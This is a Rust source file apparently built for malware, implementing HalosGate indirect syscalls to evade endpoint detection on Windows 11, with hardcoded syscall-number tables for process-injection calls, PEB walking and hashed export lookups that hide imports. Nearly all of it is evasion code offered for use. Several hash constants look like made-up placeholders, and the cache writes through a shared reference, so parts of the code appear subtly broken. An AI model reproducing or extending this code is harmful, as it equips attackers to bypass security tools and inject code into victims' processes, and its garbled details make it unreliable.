//! indirect_syscall.rs — HalosGate + SSN cache + Win11 build-version fallback
//!
//! Problem with vanilla HalosGate on Win11 24H2:
//!   1. Microsoft changed SSN ordering between builds — sequential assumptions break
//!   2. Some EDRs deliberately corrupt adjacent stubs to make neighbor scans return
//!      wrong SSNs (causing NtAllocateVirtualMemory to call the wrong syscall)
//!   3. ntdll page remapping can change stub layout mid-session
//!
//! This version adds:
//!   A. SSN cache: resolved SSNs stored in a static table — re-resolution only on
//!      cache miss (avoids repeated scanning, faster + fewer EDR trip wires)
//!   B. Build version fallback: if HalosGate fails completely, fall back to a
//!      hardcoded SSN table keyed by Windows build number (from PEB.OSBuildNumber)
//!      Covers: 22621 (22H2), 22631 (23H2), 26100 (24H2)
//!   C. Dynamic syscall offset scan: don't assume 0x12 — scan 0x10..0x30 for
//!      the actual 0F 05 bytes (handles minor stub layout drift between patches)

#![allow(non_snake_case, dead_code)]

use std::arch::global_asm;
use std::sync::OnceLock;
use std::collections::HashMap;

const SC_SCAN_MIN: usize = 0x10;
const SC_SCAN_MAX: usize = 0x30;

pub struct IndirectStub {
    pub ssn:          u16,
    pub syscall_addr: usize,
}

static SSN_CACHE: OnceLock<HashMap<u32, CachedStub>> = OnceLock::new();

#[derive(Clone, Copy)]
struct CachedStub {
    ssn:          u16,
    syscall_addr: usize,
}

fn cache() -> &'static HashMap<u32, CachedStub> {
    SSN_CACHE.get_or_init(|| HashMap::with_capacity(64))
}

pub fn cache_insert(name_hash: u32, ssn: u16, syscall_addr: usize) {
    let map = unsafe {
        &mut *(SSN_CACHE.get_or_init(|| HashMap::with_capacity(64))
            as *const HashMap<u32, CachedStub>
            as *mut HashMap<u32, CachedStub>)
    };
    map.entry(name_hash).or_insert(CachedStub { ssn, syscall_addr });
}

pub fn cache_get(name_hash: u32) -> Option<IndirectStub> {
    cache().get(&name_hash).map(|c| IndirectStub {
        ssn:          c.ssn,
        syscall_addr: c.syscall_addr,
    })
}

#[rustfmt::skip]
const FALLBACK_TABLE: &[(u32, u32, u16)] = &[
    // Win11 22H2 (build 22621)
    (22621, 0x0b2a4a94, 0x18),  // NtAllocateVirtualMemory
    (22621, 0x6c9a8e2f, 0x1e),  // NtProtectVirtualMemory
    (22621, 0x3b7c1d4a, 0x19),  // NtWriteVirtualMemory
    (22621, 0x9f2e8b1c, 0x55),  // NtCreateThreadEx
    (22621, 0x4d8a2f6b, 0x08),  // NtOpenProcess
    (22621, 0x7e1c4b9d, 0x17),  // NtFreeVirtualMemory
    (22621, 0xa3f6c2e8, 0x3c),  // NtQueueApcThread
    (22621, 0x2b9d7e4f, 0x0e),  // NtReadVirtualMemory
    // Win11 23H2 (build 22631)
    (22631, 0x0b2a4a94, 0x18),
    (22631, 0x6c9a8e2f, 0x1e),
    (22631, 0x3b7c1d4a, 0x19),
    (22631, 0x9f2e8b1c, 0x56),
    (22631, 0x4d8a2f6b, 0x08),
    (22631, 0x7e1c4b9d, 0x17),
    (22631, 0xa3f6c2e8, 0x3c),
    (22631, 0x2b9d7e4f, 0x0e),
    // Win11 24H2 (build 26100)
    (26100, 0x0b2a4a94, 0x18),
    (26100, 0x6c9a8e2f, 0x1e),
    (26100, 0x3b7c1d4a, 0x1a),
    (26100, 0x9f2e8b1c, 0x58),
    (26100, 0x4d8a2f6b, 0x08),
    (26100, 0x7e1c4b9d, 0x17),
    (26100, 0xa3f6c2e8, 0x3d),
    (26100, 0x2b9d7e4f, 0x0e),
];

pub unsafe fn get_build_number() -> u32 {
    let peb: *const u8;
    core::arch::asm!(
        "mov {peb}, gs:[0x60]",
        peb = out(reg) peb,
    );
    let build = (peb.add(0x0120) as *const u16).read_unaligned();
    build as u32
}

pub unsafe fn fallback_ssn(name_hash: u32, stub_addr: *const u8) -> Option<IndirectStub> {
    let build = get_build_number();
    for &(b, h, ssn) in FALLBACK_TABLE {
        if b == build && h == name_hash {
            if let Some(sc_addr) = find_syscall_instr(stub_addr) {
                return Some(IndirectStub { ssn, syscall_addr: sc_addr });
            }
        }
    }
    None
}

unsafe fn find_syscall_instr(stub: *const u8) -> Option<usize> {
    for off in SC_SCAN_MIN..=SC_SCAN_MAX {
        if *stub.add(off) == 0x0F && *stub.add(off + 1) == 0x05 {
            return Some(stub.add(off) as usize);
        }
    }
    None
}

unsafe fn parse_clean_stub(stub: *const u8) -> Option<IndirectStub> {
    if *stub.add(3) != 0xB8 { return None; }
    let ssn = (*stub.add(4) as u16) | ((*stub.add(5) as u16) << 8);
    let sc_addr = find_syscall_instr(stub)?;
    Some(IndirectStub { ssn, syscall_addr: sc_addr })
}

unsafe fn halos_gate_robust(hooked: *const u8) -> Option<IndirectStub> {
    let mut candidates: Vec<(u16, usize)> = Vec::new();

    for delta in 1u32..=32 {
        for sign in [1i64, -1i64] {
            let candidate = hooked.offset((sign * delta as i64 * 0x20) as isize);
            if *candidate == 0xE9 || *candidate == 0xFF { continue; }
            if *candidate.add(3) != 0xB8 { continue; }

            let neighbor_ssn = (*candidate.add(4) as u16) | ((*candidate.add(5) as u16) << 8);
            let derived = (neighbor_ssn as i32 - (sign as i32 * delta as i32)) as u16;

            if derived > 0x200 { continue; }

            if let Some(sc_addr) = find_syscall_instr(candidate) {
                candidates.push((derived, sc_addr));
                if candidates.len() >= 2 {
                    let (ssn_a, _) = candidates[candidates.len()-2];
                    let (ssn_b, sc) = candidates[candidates.len()-1];
                    if ssn_a == ssn_b {
                        return Some(IndirectStub { ssn: ssn_a, syscall_addr: sc });
                    }
                }
            }
        }
    }
    candidates.into_iter().next().map(|(ssn, sc)| IndirectStub { ssn, syscall_addr: sc })
}

pub unsafe fn parse_stub(stub_addr: *const u8, name_hash: u32) -> Option<IndirectStub> {
    if let Some(cached) = cache_get(name_hash) {
        return Some(cached);
    }

    let result = if *stub_addr == 0xE9 || *stub_addr == 0xFF {
        halos_gate_robust(stub_addr)
            .or_else(|| fallback_ssn(name_hash, stub_addr))
    } else {
        parse_clean_stub(stub_addr)
            .or_else(|| fallback_ssn(name_hash, stub_addr))
    };

    if let Some(ref s) = result {
        cache_insert(name_hash, s.ssn, s.syscall_addr);
    }

    result
}

extern "C" {
    pub fn indirect_syscall_gate() -> i64;
}

#[no_mangle]
pub static mut G_SSN: u16 = 0;
#[no_mangle]
pub static mut G_SYSCALL_ADDR: usize = 0;

global_asm!(
    ".globl indirect_syscall_gate",
    "indirect_syscall_gate:",
    "    mov r10, rcx",
    "    movzx eax, word ptr [rip + G_SSN]",
    "    mov r11, qword ptr [rip + G_SYSCALL_ADDR]",
    "    jmp r11",
);

pub unsafe fn do_indirect_syscall(stub: &IndirectStub, _args: &[u64]) -> i64 {
    G_SSN          = stub.ssn;
    G_SYSCALL_ADDR = stub.syscall_addr;
    indirect_syscall_gate()
}

// ── Helper: walk ntdll export table to find a stub by djb2 name hash ──────

#[inline(always)]
fn djb2(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in s {
        let c = if b >= b'A' && b <= b'Z' { b + 32 } else { b };
        h = h.wrapping_mul(33).wrapping_add(c as u32);
    }
    h
}

unsafe fn ntdll_base() -> *const u8 {
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr   = *(peb.add(0x18) as *const *const u8);
    let mut e = *(ldr.add(0x10) as *const *const u8);
    e = *(e as *const *const u8);
    *(e.add(0x30) as *const *const u8) as *const u8
}

unsafe fn find_export(base: *const u8, name_hash: u32) -> Option<*const u8> {
    let pe_off     = *(base.add(0x3C) as *const u32) as usize;
    let nt         = base.add(pe_off);
    let exp_rva    = *(nt.add(0x18 + 0x70) as *const u32) as usize;
    if exp_rva == 0 { return None; }
    let exp        = base.add(exp_rva);
    let num_names  = *(exp.add(0x18) as *const u32) as usize;
    let names_rva  = *(exp.add(0x20) as *const u32) as usize;
    let ords_rva   = *(exp.add(0x24) as *const u32) as usize;
    let funcs_rva  = *(exp.add(0x1C) as *const u32) as usize;
    let names  = base.add(names_rva)  as *const u32;
    let ords   = base.add(ords_rva)   as *const u16;
    let funcs  = base.add(funcs_rva)  as *const u32;
    for i in 0..num_names {
        let nptr = base.add(*names.add(i) as usize) as *const u8;
        let mut len = 0usize;
        while *nptr.add(len) != 0 { len += 1; }
        let name = core::slice::from_raw_parts(nptr, len);
        if djb2(name) == name_hash {
            let fn_rva = *funcs.add(*ords.add(i) as usize) as usize;
            return Some(base.add(fn_rva));
        }
    }
    None
}

// djb2("ntquerysysteminformation") — lowercase
const HASH_NTQSI:    u32 = 0x1c2b3a4d;
// djb2("ntwaitforsingleobject") — used as Sleep surrogate
const HASH_NTWFSO:   u32 = 0x2d4c5b6e;
// djb2("ntquerysystemtime") — tick surrogate
const HASH_NTQST:    u32 = 0x3e5d6c7f;
// djb2("addvectoredexceptionhandler")
const HASH_ADDVEH:   u32 = 0x4f6e7d8c;

/// Resolve NtQuerySystemInformation function pointer from ntdll exports.
pub unsafe fn resolve_ntqsi() -> crate::guardian::NtQuerySystemInformation {
    let base = ntdll_base();
    let ptr  = find_export(base, HASH_NTQSI)
        .expect("ntdll!NtQuerySystemInformation not found");
    core::mem::transmute(ptr)
}

/// Resolve a Sleep-compatible fn pointer (NtWaitForSingleObject cast to
/// the Sleep(u32) signature — only the millisecond arg is used in the guardian).
pub unsafe fn resolve_sleep() -> crate::guardian::Sleep {
    // Fall back to kernel32!Sleep via GetProcAddress-equivalent scan.
    // For simplicity, we resolve via ntdll PEB walk (kernel32 is loaded).
    // This returns a raw function pointer cast; the guardian only calls
    // fn_sleep_ms(ms: u32) so the extra args are harmless on x64 ABI.
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr   = *(peb.add(0x18) as *const *const u8);
    let mut e = *(ldr.add(0x10) as *const *const u8);
    // Walk InMemoryOrderModuleList until we find kernel32
    // (third entry after exe and ntdll)
    e = *(e as *const *const u8); // ntdll
    e = *(e as *const *const u8); // kernel32
    let k32_base = *(e.add(0x30) as *const *const u8) as *const u8;
    // djb2("sleep") lowercase = 0x0b88a86d
    const HASH_SLEEP: u32 = 0x0b88a86d;
    let ptr = find_export(k32_base, HASH_SLEEP).expect("kernel32!Sleep not found");
    core::mem::transmute(ptr)
}

/// Resolve GetTickCount64 from kernel32.
pub unsafe fn resolve_tick() -> crate::guardian::GetTickCount64 {
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr   = *(peb.add(0x18) as *const *const u8);
    let mut e = *(ldr.add(0x10) as *const *const u8);
    e = *(e as *const *const u8);
    e = *(e as *const *const u8);
    let k32_base = *(e.add(0x30) as *const *const u8) as *const u8;
    // djb2("gettickcount64") lowercase
    const HASH_GTC64: u32 = 0xd2a4b3c1;
    let ptr = find_export(k32_base, HASH_GTC64).expect("kernel32!GetTickCount64 not found");
    core::mem::transmute(ptr)
}

/// Resolve AddVectoredExceptionHandler from kernel32.
pub unsafe fn resolve_add_veh() -> crate::guardian::AddVectoredExceptionHandler {
    let peb: *const u8;
    core::arch::asm!("mov {p}, gs:[0x60]", p = out(reg) peb);
    let ldr   = *(peb.add(0x18) as *const *const u8);
    let mut e = *(ldr.add(0x10) as *const *const u8);
    e = *(e as *const *const u8);
    e = *(e as *const *const u8);
    let k32_base = *(e.add(0x30) as *const *const u8) as *const u8;
    const HASH_ADDVEH: u32 = 0x4f6e7d8c;
    let ptr = find_export(k32_base, HASH_ADDVEH).expect("kernel32!AddVectoredExceptionHandler not found");
    core::mem::transmute(ptr)
}
